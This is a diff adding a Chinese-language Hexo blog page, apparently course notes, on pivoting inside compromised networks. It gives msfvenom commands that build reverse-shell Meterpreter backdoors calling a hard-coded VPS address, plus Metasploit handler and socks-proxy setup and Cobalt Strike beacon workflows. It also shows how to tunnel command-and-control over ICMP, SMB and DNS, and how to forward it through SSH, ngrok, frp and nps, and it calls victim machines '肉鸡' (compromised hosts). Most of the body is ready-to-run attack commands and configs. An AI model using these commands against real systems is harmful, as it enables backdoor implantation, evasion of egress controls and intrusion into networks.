@@ -1,0 +1,452 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="内网穿透by小迪">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网穿透 | xiaodisec">
+<meta property="og:url" content="https://killeveee.github.io/archives/2022/08/05/%E4%BB%A3%E7%90%86%E3%80%81%E9%9A%A7%E9%81%93%E3%80%81%E7%A9%BF%E9%80%8F/index.html">
+<meta property="og:site_name" content="killeveee">
+<meta property="og:description" content="内网穿透by小迪">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-08-05T07:11:33.000Z">
+<meta property="article:modified_time" content="2023-12-24T05:58:21.435Z">
+<meta property="article:author" content="killeveee">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>内网穿透 | xiaodisec</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2022/08/06/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8xd/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2022/08/01/linux%E6%8F%90%E6%9D%83/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://killeveee.github.io/archives/2022/08/05/%E4%BB%A3%E7%90%86%E3%80%81%E9%9A%A7%E9%81%93%E3%80%81%E7%A9%BF%E9%80%8F/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://killeveee.github.io/archives/2022/08/05/%E4%BB%A3%E7%90%86%E3%80%81%E9%9A%A7%E9%81%93%E3%80%81%E7%A9%BF%E9%80%8F/&text=内网穿透 | xiaodisec"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://killeveee.github.io/archives/2022/08/05/%E4%BB%A3%E7%90%86%E3%80%81%E9%9A%A7%E9%81%93%E3%80%81%E7%A9%BF%E9%80%8F/&title=内网穿透 | xiaodisec"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://killeveee.github.io/archives/2022/08/05/%E4%BB%A3%E7%90%86%E3%80%81%E9%9A%A7%E9%81%93%E3%80%81%E7%A9%BF%E9%80%8F/&is_video=false&description=内网穿透 | xiaodisec"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=内网穿透 | xiaodisec&body=Check out this article: https://killeveee.github.io/archives/2022/08/05/%E4%BB%A3%E7%90%86%E3%80%81%E9%9A%A7%E9%81%93%E3%80%81%E7%A9%BF%E9%80%8F/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://killeveee.github.io/archives/2022/08/05/%E4%BB%A3%E7%90%86%E3%80%81%E9%9A%A7%E9%81%93%E3%80%81%E7%A9%BF%E9%80%8F/&title=内网穿透 | xiaodisec"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://killeveee.github.io/archives/2022/08/05/%E4%BB%A3%E7%90%86%E3%80%81%E9%9A%A7%E9%81%93%E3%80%81%E7%A9%BF%E9%80%8F/&title=内网穿透 | xiaodisec"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://killeveee.github.io/archives/2022/08/05/%E4%BB%A3%E7%90%86%E3%80%81%E9%9A%A7%E9%81%93%E3%80%81%E7%A9%BF%E9%80%8F/&title=内网穿透 | xiaodisec"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://killeveee.github.io/archives/2022/08/05/%E4%BB%A3%E7%90%86%E3%80%81%E9%9A%A7%E9%81%93%E3%80%81%E7%A9%BF%E9%80%8F/&title=内网穿透 | xiaodisec"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://killeveee.github.io/archives/2022/08/05/%E4%BB%A3%E7%90%86%E3%80%81%E9%9A%A7%E9%81%93%E3%80%81%E7%A9%BF%E9%80%8F/&name=内网穿透 | xiaodisec&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://killeveee.github.io/archives/2022/08/05/%E4%BB%A3%E7%90%86%E3%80%81%E9%9A%A7%E9%81%93%E3%80%81%E7%A9%BF%E9%80%8F/&t=内网穿透 | xiaodisec"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">代理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.1.</span> <span class="toc-text">正&#x2F;反向连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.2.</span> <span class="toc-text">MSF实操</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.3.</span> <span class="toc-text">CS实操</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">2.1.</span> <span class="toc-text">ICMP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">2.2.</span> <span class="toc-text">SMB</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">2.3.</span> <span class="toc-text">DNS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">2.4.</span> <span class="toc-text">SSH</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">穿透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">3.1.</span> <span class="toc-text">Ngrok</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">3.2.</span> <span class="toc-text">Frp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">3.3.</span> <span class="toc-text">Nps</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">3.4.</span> <span class="toc-text">Spp</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        内网穿透 | xiaodisec
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">killeveee</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-08-05T07:11:33.000Z" class="dt-published" itemprop="datePublished">2022-08-05</time>
+        
+      
+    </div>
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <ul>
+<li>代理技术：解决<strong>网络通讯不通</strong>的问题（利用 跳板机建立节点 后续操作）</li>
+<li>隧道技术：解决<strong>不出网协议</strong>上线的问题（利用 出网协议进行封装 出网）<blockquote>
+<p>代理 使用的场景是 网络不可达。<br>隧道 使用的场景是 网络可达但是协议被墙。</p>
+</blockquote>
+</li>
+</ul>
+<h2><span id="代理">代理</span></h2><p><strong>解决网络通讯不通的问题</strong><br>拿下一台跳板机后，MSF需要<strong>添加路由</strong>，而CS什么都不用做。<br>添加路由后，说明MSF&amp;CS可以访问这个网段了，但是其他的软件或者主机还是无法访问内网主机的。<br>所以继续，<strong>建立节点</strong>。MSF使用socks模块建立节点，CS直接图形化操作建立节点。然后使用代理工具(Proxifier…)进行代理，(利用代理工具可以设置访问的目标主机和使用代理的软件)。</p>
+<blockquote>
+<p>一般不会把工具上传到跳板机上传继续渗透，工具太大上传时可能会丢失数据，而且攻击的动作太大容易被监控报警。</p>
+</blockquote>
+<h3><span id="正x2f反向连接">正&#x2F;反向连接</span></h3><ul>
+<li>正向连接——入站</li>
+<li>反向连接——出站</li>
+</ul>
+<p>大部分都是出站容易，入站难。</p>
+<hr>
+<h3><span id="msf实操">MSF实操</span></h3><ul>
+<li>反向：reverse</li>
+<li>正向：bind</li>
+</ul>
+<p><strong>生成后门：</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">反向：msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;8.130.85.89 LPORT&#x3D;4444 -f exe &gt; reverse.exe
+正向：msfvenom -p windows&#x2F;meterpreter&#x2F;bind_tcp LHOST&#x3D;0.0.0.0 LPORT&#x3D;3333 -f exe &gt; bind.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><strong>添加路由</strong>：</p>
+<pre class="line-numbers language-none"><code class="language-none">查看路由：run autoroute -p
+添加路由：run post&#x2F;multi&#x2F;manage&#x2F;autoroute<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><strong>建立socks代理节点</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">use auxiliary&#x2F;server&#x2F;socks_proxy
+set srvhost 0.0.0.0
+set srvport 1111
+run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<h3><span id="cs实操">CS实操</span></h3><ul>
+<li>反向：Beacon HTTP…</li>
+<li>正向：Beacon TCP…<br>流程：<br>攻击目标拿shell、上传后门执行、跳板机上线；建立节点、设置代理、攻击目标拿shell、上传后门执行、在跳板机执行beacon命令<code>connect ip port</code>，内网机器上线。<h2><span id="隧道">隧道</span></h2></li>
+</ul>
+<p><strong>解决不出网协议上线的问题</strong>。<br>隧道举例：</p>
+<pre class="line-numbers language-none"><code class="language-none">TCP&#x2F;IP协议：
+应用层：HTTP&#x2F;FTP&#x2F;SMTP&#x2F;Telnet
+传输层：TCP&#x2F;UDP
+网络层：ICMP&#x2F;IP&#x2F;IGMP
+链路层：ARP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>例如：如果tcp协议被墙，只能用UDP或者ICMP隧道等，这里是向下兼容。<br>常用的隧道有：ICMP、SMB、DNS</p>
+<h3><span id="icmp">ICMP</span></h3><p><a target="_blank" rel="noopener" href="https://github.com/esrrhs/spp">https://github.com/esrrhs/spp</a><br><a target="_blank" rel="noopener" href="https://github.com/bdamele/icmpsh">https://github.com/bdamele/icmpsh</a><br><a target="_blank" rel="noopener" href="https://github.com/esrrhs/pingtunnel">https://github.com/esrrhs/pingtunnel***</a><br>当开启出站检测，禁止所有端口。此时可以ping通外网，但是浏览器无法访问外网。<br>说明ICMP协议可用，而端口全部禁止了。<br>如果用反向连接，因为有出站策略，所有肯定不能直接反向。<br>正向连接更不行，我都找不到肉鸡。<br><strong>利用ICMP建立隧道连接：肉鸡后门去找它本机的端口，使用ICMP转发工具把那个端口的TCP数据包装成ICMP协议并转发给我，我使用相同的ICMP转发工具将收到的ICMP数据包变成TCP数据。</strong><br>很鸡肋的是，pingtunnel需要管理员权限运行……<br>1、CS上线<br>VPS:</p>
+<pre class="line-numbers language-none"><code class="language-none">.&#x2F;pingtunnel -type server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>肉鸡(管理员运行)：</p>
+<pre class="line-numbers language-none"><code class="language-none">pingtunnel.exe -type client -l 127.0.0.1:6666 -s 8.130.85.89 -t 8.130.85.89:7777 -tcp 1 -noprint 1 -nolog 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">CS:
+监听器1：127.0.0.1 6666
+监听器2：8.130.85.89 7777<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>生成监听器1的Stager后门肉鸡执行<br>2、MSF上线<br>生成后门：</p>
+<pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;127.0.0.1 LPORT&#x3D;3333 -f exe &gt; reverse.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>MSF启动监听：</p>
+<pre class="line-numbers language-none"><code class="language-none">msfconsole
+use exploit&#x2F;multi&#x2F;handler
+set payload windows&#x2F;meterpreter&#x2F;reverse_tcp
+set lhost 0.0.0.0
+set lport 4444
+exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>Kali开启隧道：</p>
+<pre class="line-numbers language-none"><code class="language-none">.&#x2F;pingtunnel -type server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>Win开启隧道 &#x2F;&#x2F;将本地3333 icmp协议数据转发至66ip的4444流量上(管理员运行)</p>
+<pre class="line-numbers language-none"><code class="language-none">pingtunnel.exe -type client -l 127.0.0.1:3333 -s 8.130.85.89 -t 8.130.85.89:4444 -tcp 1 -noprint 1 -nolog 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3><span id="smb">SMB</span></h3><p>Windows 将命名管道通信封装在 SMB 协议中，此流量封装在SMB协议中，所以SMB beacon相对隐蔽。SMB beacon不能直接生成可用载荷, 只能使用 PsExec 或 Stageless Payload 上线。<br>配合横向移动使用。<br>SMB Beacon的使用条件如下：</p>
+<ul>
+<li>具有 SMB Beacon 的主机必须接受 <strong>445</strong> 端口上的连接。</li>
+<li>只能链接由同一个 Cobalt Strike 实例管理的 Beacon。</li>
+<li>利用这种beacon横移必须有目标主机的管理员组的权限或者说是拥有具有管理员组权限的<strong>凭据</strong>。<h3><span id="dns">DNS</span></h3>判断：<code>nslookup</code>、<code>dig</code><br>内网主机只出网DNS协议数据<br>1、添加域名记录<br>A记录：<br>cs.xxx.com —&gt; 81.123.56.78<br>添加NS记录：<br>ns：ns.xxx.com —&gt; cs.xxx.com<br>2、创建监听器<br>在CS创建监听器时选择<code>Beacon DNS</code>。<br>DNS地址写：ns.xxx.com<br>DNS地址(Stager)写：cs.xxx.com<br>3、生成后门绑定监听器，执行上线<br>DNS解析过程：ns.xxx.com —&gt; cs.xxx.com —&gt;  81.123.56.78<br>这样就反向找到了，但是上线后还是黑色的，再执行命令：<code>mode dns-txt</code></li>
+</ul>
+<h3><span id="ssh">SSH</span></h3><p>拿下一台内网的<strong>linux跳板机</strong>时，可以用ssh隧道….还是很鸡肋冷门的。<br>开启ssh协议登录：</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">vi &#x2F;etc&#x2F;ssh&#x2F;sshd_config
+PermitRootLogin yes
+PasswordAuthentication yes
+&#x2F;etc&#x2F;init.d&#x2F;ssh start
+&#x2F;etc&#x2F;init.d&#x2F;ssh restart
+#本地 出站封 正向
+#将内网的192.168.1.15主机的8080端口映射到 跳板机192.168.1.166 的1234端口
+ssh -CfNg -L 1122:192.168.1.15:8080 root@192.168.1.166
+curl http:&#x2F;&#x2F;127.0.0.1:1122
+
+#远程 入站封 反向
+#将内网的192.168.1.15主机的8080端口映射到 攻击机81.123.56.78 的1234端口。
+ssh -CfNg -R 1234:192.168.1.15:8080 root@81.123.56.78	#跳板机linux执行
+curl http:&#x2F;&#x2F;127.0.0.1:1234	#攻击机执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2><span id="穿透">穿透</span></h2><p><strong>实现两个内网的通讯</strong>。<br>工具：<br>Ngrok	入门型：<a target="_blank" rel="noopener" href="https://www.ngrok.cc/">https://www.ngrok.cc</a><br>Frp 		简易型：<a target="_blank" rel="noopener" href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a><br>Nps 可以自定义：<a target="_blank" rel="noopener" href="https://github.com/ehang-io/nps">https://github.com/ehang-io/nps</a><br>Spp 有特殊协议：<a target="_blank" rel="noopener" href="https://github.com/esrrhs/spp">https://github.com/esrrhs/spp</a><br>EW（停更）：<a target="_blank" rel="noopener" href="http://www.rootkiter.com/EarthWorm">http://www.rootkiter.com/EarthWorm</a></p>
+<h3><span id="ngrok">Ngrok</span></h3><p><a target="_blank" rel="noopener" href="https://www.ngrok.cc/">https://www.ngrok.cc</a><br>注册，交2块钱实名，建立免费隧道，协议<code>tcp</code>，隧道名称自己写，本地端口填写kail的<code>IP:端口</code> 。<br>下载客户端，Sunny。kali执行命令：</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">.&#x2F;sunny clientid 130117399640<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>后面的id就是生成的隧道id。<br>生成MSF后门</p>
+<pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;qwq.free.idcfengye.com lport&#x3D;80 -f exe -o ngrok.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfconsole
+use exploit&#x2F;multi&#x2F;handler
+set payload windows&#x2F;meterpreter&#x2F;reverse_tcp
+set lhost 0.0.0.0
+set lport 2222
+run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3><span id="frp">Frp</span></h3><p><a target="_blank" rel="noopener" href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a><br>frp是一个专注于内网穿透的高性能的反向代理应用，支持TCP、UDP、HTTP、HTTPS 等多种协议。可以将内网服务以安全、便捷的方式通过具有公网IP节点的中转暴露到公网。<br>自行搭建，方便修改，成本低，使用多样化，隐私。<br>1、服务端-下载-解压-修改-启动（阿里云主机记得修改安全组配置出入口）<br>服务器修改配置文件frps.ini：</p>
+<pre class="line-numbers language-none"><code class="language-none">[common]
+bind_port &#x3D; 7000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>启动服务端：</p>
+<pre class="line-numbers language-none"><code class="language-none">.&#x2F;frps -c .&#x2F;frps.ini<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>2、控制端-下载-解压-修改-启动<br>控制端修改配置文件frpc.ini：</p>
+<pre class="line-numbers language-none"><code class="language-none">[common]
+server_addr &#x3D; 47.94.236.117
+server_port &#x3D; 7000        #frpc工作端口，必须和上面frps保持一致
+
+[msf]
+type &#x3D; tcp
+local_ip &#x3D; 127.0.0.1
+local_port &#x3D; 5555          #转发给本机的5555
+remote_port &#x3D; 6000         #服务端用6000端口转发给本机<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>启动客户端：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./frpc -c ./frpc.ini
+msfvenom -p windows/meterpreter/reverse_tcp <span class="token assign-left variable">lhost</span><span class="token operator">=</span><span class="token number">8.130</span>.85.89 <span class="token assign-left variable">lport</span><span class="token operator">=</span><span class="token number">6000</span> -f exe -o Frp.exe
+use exploit/multi/handler
+<span class="token builtin class-name">set</span> payload windows/meterpreter/reverse_tcp
+<span class="token builtin class-name">set</span> LHOST <span class="token number">127.0</span>.0.1
+<span class="token builtin class-name">set</span> LPORT <span class="token number">5555</span>
+exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>3、靶机运行frp.exe即可</p>
+<h3><span id="nps">Nps</span></h3><p><a target="_blank" rel="noopener" href="https://github.com/ehang-io/nps">https://github.com/ehang-io/nps</a><br>是Frp的升级版。Ngrok就是在Nps的基础上搞的收费版。</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#【服务端】在vps上执行</span>
+<span class="token function">tar</span> -zxvf nps-linux_amd64_server.tar.gz
+./nps <span class="token function">install</span>
+./nps<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>访问，账号密码admin&#x2F;123：</p>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;8.130.85.89:8080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>点击 客户端- -&gt; 新增，没有要求直接写个名字新增 –&gt; 点击客户端后面的隧道按钮 –&gt;新增，服务端端口 和 目标端口 表示会把传输到服务端端口的数据 转发到 客户端的目标端口。<br>把客户端上传到本地kali</p>
+<pre class="line-numbers language-none"><code class="language-none">tar -zxvf nps-linux_amd64_client.tar.gz
+.&#x2F;npc -server&#x3D;47.94.236.117:8024  -vkey&#x3D;wnedkcbixtazg5wu<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>开始攻击</p>
+<pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;8.130.85.89 lport&#x3D;5555 -f exe -o Nps.exe
+
+msfconsole
+use exploit&#x2F;multi&#x2F;handler
+set payload windows&#x2F;meterpreter&#x2F;reverse_tcp
+set LHOST 127.0.0.1
+set LPORT 4444
+run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3><span id="spp">Spp</span></h3><p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/esrrhs/spp">https://github.com/esrrhs/spp</a></p>
+<blockquote>
+<p>支持的协议：tcp、udp、udp、icmp、http、kcp、quic<br>支持的类型：正向代理、反向代理、socks5正向代理、socks5反向代理</p>
+</blockquote>
+<p>在对抗项目中有遇到过一些极端环境，比如目标封了tcp，http等常用出网的协议，但是icmp，dns等协议可能因为业务需要或者管理者安全意识不到位导致没有封干净。在这种场景下就可以使用这些容易被忽视的协议进行隧道的搭建。<br>1、服务端vps：监听本地的icmp数据</p>
+<pre class="line-numbers language-none"><code class="language-none">.&#x2F;spp -type server -proto ricmp -listen 0.0.0.0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>2、客户端靶机：将本地的8082给到8.130.85.89的8081上（TCP封装icmp）</p>
+<pre class="line-numbers language-none"><code class="language-none">spp -name &quot;test&quot; -type proxy_client -server 8.130.85.89 -fromaddr :8082 -toaddr :8081 -proxyproto tcp -proto ricmp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>3、服务端vps开启CS</p>
+<pre class="line-numbers language-none"><code class="language-none">监听器1：http 47.94.236.117 8081
+监听器2：http 127.0.0.1 8082
+【!】用监听器2生成后门<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/categories/">分类</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">代理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.1.</span> <span class="toc-text">正&#x2F;反向连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.2.</span> <span class="toc-text">MSF实操</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.3.</span> <span class="toc-text">CS实操</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">2.1.</span> <span class="toc-text">ICMP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">2.2.</span> <span class="toc-text">SMB</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">2.3.</span> <span class="toc-text">DNS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">2.4.</span> <span class="toc-text">SSH</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">穿透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">3.1.</span> <span class="toc-text">Ngrok</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">3.2.</span> <span class="toc-text">Frp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">3.3.</span> <span class="toc-text">Nps</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">3.4.</span> <span class="toc-text">Spp</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://killeveee.github.io/archives/2022/08/05/%E4%BB%A3%E7%90%86%E3%80%81%E9%9A%A7%E9%81%93%E3%80%81%E7%A9%BF%E9%80%8F/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://killeveee.github.io/archives/2022/08/05/%E4%BB%A3%E7%90%86%E3%80%81%E9%9A%A7%E9%81%93%E3%80%81%E7%A9%BF%E9%80%8F/&text=内网穿透 | xiaodisec"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://killeveee.github.io/archives/2022/08/05/%E4%BB%A3%E7%90%86%E3%80%81%E9%9A%A7%E9%81%93%E3%80%81%E7%A9%BF%E9%80%8F/&title=内网穿透 | xiaodisec"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://killeveee.github.io/archives/2022/08/05/%E4%BB%A3%E7%90%86%E3%80%81%E9%9A%A7%E9%81%93%E3%80%81%E7%A9%BF%E9%80%8F/&is_video=false&description=内网穿透 | xiaodisec"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
